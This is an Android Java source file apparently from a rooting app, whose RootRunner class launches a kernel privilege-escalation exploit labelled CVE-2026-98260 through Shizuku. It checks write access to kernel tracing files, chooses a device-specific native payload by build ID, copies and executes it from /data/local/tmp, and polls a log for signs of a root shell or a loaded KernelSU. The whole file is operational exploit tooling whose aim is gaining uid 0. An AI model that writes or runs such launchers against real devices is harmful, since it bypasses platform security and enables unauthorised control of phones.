package com.avrroot;

import android.content.Context;
import android.os.Build;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.lang.reflect.Method;

import rikka.shizuku.Shizuku;

/**
 * Runs the CVE-2026-98260 exploit in shell (uid 2000) context through Shizuku,
 * then watches /data/local/tmp/timer.log until it succeeds or gives up.
 */
public class RootRunner implements Runnable {

    public interface Sink {
        void onLine(String line);

        void onDone(boolean ok, String summary);
    }

    private static final String TIMER_LOG = "/data/local/tmp/timer.log";
    private static final long TIMEOUT_MS = 200_000L;

    private final Context ctx;
    private final String ksuPkg;
    private final Sink sink;

    public RootRunner(Context ctx, String ksuPkg, Sink sink) {
        this.ctx = ctx;
        this.ksuPkg = ksuPkg;
        this.sink = sink;
    }

    /** Shizuku.newProcess is a hidden static API; invoke it reflectively. */
    private static Process newProcess(String[] cmd, String[] env) throws Exception {
        Method m = Shizuku.class.getDeclaredMethod(
                "newProcess", String[].class, String[].class, String.class);
        m.setAccessible(true);
        return (Process) m.invoke(null, cmd, env, "/data/local/tmp");
    }

    private static Process newProcess(String[] cmd) throws Exception {
        return newProcess(cmd, new String[]{});
    }

    private static String sh(String command, String[] env) {
        try {
            Process p = newProcess(new String[]{"/system/bin/sh", "-c", command}, env);
            StringBuilder sb = new StringBuilder();
            try (BufferedReader r = new BufferedReader(
                    new InputStreamReader(p.getInputStream(), "UTF-8"))) {
                String line;
                while ((line = r.readLine()) != null) {
                    sb.append(line).append('\n');
                }
            }
            p.waitFor();
            return sb.toString();
        } catch (Throwable t) {
            return "ERR " + t;
        }
    }

    public static String runShizukuCommand(String command) {
        return sh(command, new String[]{});
    }

    /** /proc/version 的内核串（A17 上 /proc/sys/kernel/osrelease 读不到）。 */
    private static String kernelHint() {
        String v = sh("awk '{print $3}' /proc/version 2>/dev/null");
        return v == null ? "?" : v.trim().isEmpty() ? "?" : v.trim();
    }

    private static String sh(String command) {
        return sh(command, new String[]{});
    }

    /** 按内核串选择载荷：A17 用 a17 偏移，其余用 a16。 */
    /**
     * 按 build 选 payload：
     *   A171WWH.* (Android 17) -> libtimer-a17.so
     *   W3WWL*    (Android 16) -> libtimer-a16.so
     * 两者偏移不同（kallsyms / call-site 都变了），选错会写偏并 panic。
     */
    private static String payloadLib() {
        String[] sources = {Build.ID, Build.DISPLAY, Build.FINGERPRINT};
        for (String s : sources) {
            if (s != null && s.contains("A171WWH")) {
                return "libtimer-a17.so";
            }
        }
        return "libtimer-a16.so";
    }

    /**
     * 真机自检：exploit 需要**写** tracefs（trigger / tracing_on / buffer_size_kb），
     * 而 Android 的 shell 通常只有 readtracefs 只读组 —— 读得到不等于写得进。
     * 这里在启动前实际写一次（写入当前值，不改变任何状态），失败就提前中止，
     * 免得白跑一轮还让用户怀疑偏移。
     *
     * @return null = 通过；否则是失败原因
     */
    /**
     * 环境自检：把 exploit 依赖的每一项都真跑一遍，并把 **stderr 一起收回来**。
     *
     * 只做诊断、不再硬拦 —— 自检失败时 run() 会打警告然后照样尝试，
     * 因为失败原因可能是"当前状态不允许"而不是"永远不允许"。
     *
     * @return 多行报告；第一行以 "OK" 或 "FAIL" 开头
     */
    private String preflight() {
        StringBuilder sb = new StringBuilder();
        boolean ok = true;

        // 身份 / 域：Shizuku 拉起的进程与 adb shell 可能不是同一个 SELinux 域
        String ident = sh("exec 2>&1; id; echo ---; id -Z; echo ---; getenforce").trim();
        sb.append("id: ").append(ident.replace("\n", " | ")).append('\n');

        // 1) slabinfo
        String r = sh("exec 2>&1; head -1 /proc/slabinfo");
        boolean b1 = r.contains("slabinfo - version");
        ok &= b1;
        sb.append(b1 ? "  ✓ slabinfo 可读" : "  ✗ slabinfo 失败: " + r.trim()).append('\n');

        // 2) 关键：events/kmem/rss_stat/trigger 可写（arm 后立刻 disarm）
        r = sh("exec 2>&1; T=/sys/kernel/tracing/events/kmem/rss_stat/trigger; "
                + "echo enable_event:kmem:kmem_cache_alloc > $T; rc=$?; "
                + "echo disable_event:kmem:kmem_cache_alloc > $T; rc2=$?; "
                + "echo RC=$rc/$rc2");
        boolean b2 = r.contains("RC=0/0");
        ok &= b2;
        sb.append(b2 ? "  ✓ rss_stat/trigger 可写"
                     : "  ✗ rss_stat/trigger 失败: " + r.trim().replace("\n", " | ")).append('\n');

        // 3) /trace 可写（清缓冲）
        r = sh("exec 2>&1; echo > /sys/kernel/tracing/trace; echo RC=$?");
        boolean b3 = r.contains("RC=0");
        ok &= b3;
        sb.append(b3 ? "  ✓ trace 可写" : "  ✗ trace 失败: " + r.trim().replace("\n", " | ")).append('\n');

        // 4) tracing_on 可写（写回当前值）
        r = sh("exec 2>&1; v=$(cat /sys/kernel/tracing/tracing_on); "
                + "echo $v > /sys/kernel/tracing/tracing_on; echo RC=$?");
        boolean b4 = r.contains("RC=0");
        ok &= b4;
        sb.append(b4 ? "  ✓ tracing_on 可写"
                     : "  ✗ tracing_on 失败: " + r.trim().replace("\n", " | ")).append('\n');

        // 5) trace_pipe_raw 可读
        r = sh("exec 2>&1; head -c 0 /sys/kernel/tracing/per_cpu/cpu0/trace_pipe_raw; echo RC=$?");
        boolean b5 = r.contains("RC=0");
        ok &= b5;
        sb.append(b5 ? "  ✓ trace_pipe_raw 可读"
                     : "  ✗ trace_pipe_raw 失败: " + r.trim().replace("\n", " | ")).append('\n');

        return (ok ? "OK" : "FAIL") + "\n" + sb;
    }

    @Override
    public void run() {
        try {
            String report = preflight();
            for (String line : report.split("\n")) {
                if (!line.isEmpty()) {
                    sink.onLine("自检 " + line);
                }
            }
            if (report.startsWith("FAIL")) {
                sink.onLine("⚠ 自检未全部通过，仍继续尝试（失败就重启再来；"
                        + "若多项失败请把上面的自检报告发出来）");
            }

            String libName = payloadLib();
            String lib = ctx.getApplicationInfo().nativeLibraryDir + "/" + libName;
            String tmp = "/data/local/tmp/a/ptimer";
            String launch = "export PATH=/system/bin:/system/xbin:/sbin; "
                    + "mkdir -p /data/local/tmp/a; "
                    + "cp '" + lib + "' " + tmp + " && chmod 755 " + tmp
                    + " && cd /data/local/tmp"
                    + " && " + tmp + " fake -d";

            sink.onLine("正在部署载荷 (" + libName + ")，内核 " + kernelHint() + "…");
            sh(launch, new String[]{"KSU_PKG=" + ksuPkg});
            sink.onLine("exploit 已启动，正在跟踪 timer.log（成功有概率性，"
                    + "没抓中请重启后再试）…");

            long deadline = System.currentTimeMillis() + TIMEOUT_MS;
            int lastLen = 0;
            while (System.currentTimeMillis() < deadline) {
                Thread.sleep(1500);
                String log = sh("cat " + TIMER_LOG + " 2>/dev/null");
                if (log == null) {
                    log = "";
                }
                if (log.length() > lastLen) {
                    String chunk = log.substring(lastLen);
                    lastLen = log.length();
                    for (String line : chunk.split("\n")) {
                        if (!line.isEmpty()) {
                            sink.onLine(line);
                        }
                    }
                }
                if (log.contains("KSU_LOADED")) {
                    sink.onDone(true, "成功：KernelSU 已加载。验证：adb shell su -c id");
                    return;
                }
                if (log.contains("ROOT_SHELL_OK")) {
                    sink.onDone(true, "成功：已拿到 uid=0。");
                    return;
                }
                if (log.contains("parking") || log.contains("no successful plant")) {
                    sink.onDone(false,
                            "失败（没抢到 slab 重占窗口）。请重启设备后再点一次提权。");
                    return;
                }
            }
            sink.onDone(false, "超时。请重启后重试。");
        } catch (Throwable t) {
            sink.onDone(false, "错误：" + t);
        }
    }
}
